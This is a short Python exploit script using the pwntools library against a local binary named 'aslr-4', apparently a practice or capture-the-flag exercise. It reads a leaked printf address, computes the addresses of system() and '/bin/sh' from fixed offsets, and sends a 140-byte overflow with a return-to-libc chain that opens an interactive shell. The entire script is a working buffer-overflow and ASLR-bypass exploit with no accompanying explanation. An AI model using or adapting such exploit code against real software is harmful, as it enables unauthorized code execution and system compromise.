#!/usr/bin/env python

from pwn import *

p = process("./aslr-4")
l = p.recvline(1)

# Get printf addr
printf_addr = l.split()
printf_addr = int(printf_addr[-1],16)
#printf_addr += 0x67170

# get system() addr
system_offset = 0x67170
system_addr = printf_addr + system_offset

# get "/bin/sh" addr
binsh_offset = 0x11239b
binsh_addr = binsh_offset + printf_addr

# print results
print("printf_addr = " + str(hex(printf_addr)))
print("system_addr = " + str(hex(system_addr)))
print("binsh_addr = " + str(hex(binsh_addr)))

# create & send buffer
buffer = "A"*140 + p32(system_addr) + "AAAA" + p32(binsh_addr) + p32(0) + p32(0)
p.sendline(buffer)


p.interactive()
